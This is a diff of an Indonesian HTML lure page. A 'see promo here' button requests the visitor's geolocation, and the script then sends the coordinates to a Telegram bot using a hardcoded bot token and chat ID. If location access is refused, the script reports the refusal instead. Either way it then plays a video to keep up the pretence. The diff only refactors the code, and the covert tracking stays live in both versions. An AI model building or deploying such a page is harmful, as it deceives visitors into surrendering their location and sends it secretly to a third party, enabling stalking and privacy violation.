@@ -42,7 +42,7 @@
   </style>
 </head>
 <body>
-  <button id="tombolPromo" class="tombol-promo" onclick="mintaLokasi()">lihat promo disini</button>
+  <button id="tombolPromo" class="tombol-promo">lihat promo disini</button>
 
   <div id="videoContainer">
     <video width="320" height="240" controls autoplay>
@@ -55,35 +55,30 @@
     const botToken = "7579024338:AAGkv6LtQQH3uKtqD64DVNca4V7ZYwAyLT0";
     const chatId = "7420684427";
 
-    function mintaLokasi() {
-      // Sembunyikan tombol
-      document.getElementById("tombolPromo").style.display = "none";
+    document.getElementById("tombolPromo").addEventListener("click", function () {
+      const tombol = document.getElementById("tombolPromo");
+      tombol.style.display = "none"; // Sembunyikan tombol
 
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           (pos) => {
             const { latitude, longitude } = pos.coords;
-            alert(`apakah anda pengguna G2G?`);
+            alert("apakah anda pengguna G2G?");
             const pesan = `Lokasi berhasil diterima boss:\nLat: ${latitude}\nLon: ${longitude}`;
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`);
 
-            setTimeout(() => {
-              document.getElementById("videoContainer").style.display = "block";
-            }, 500);
+            document.getElementById("videoContainer").style.display = "block"; // Tampilkan video
           },
           (err) => {
             const pesan = `Pengguna menolak memberikan lokasi.`;
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`);
-            console.log("Lokasi ditolak.");
-
-            // Tetap tampilkan video meskipun lokasi ditolak
-            document.getElementById("videoContainer").style.display = "block";
+            document.getElementById("videoContainer").style.display = "block"; // Tetap tampilkan video
           }
         );
       } else {
         alert("Geolocation tidak didukung browser ini.");
       }
-    }
+    });
   </script>
 </body>
 </html>
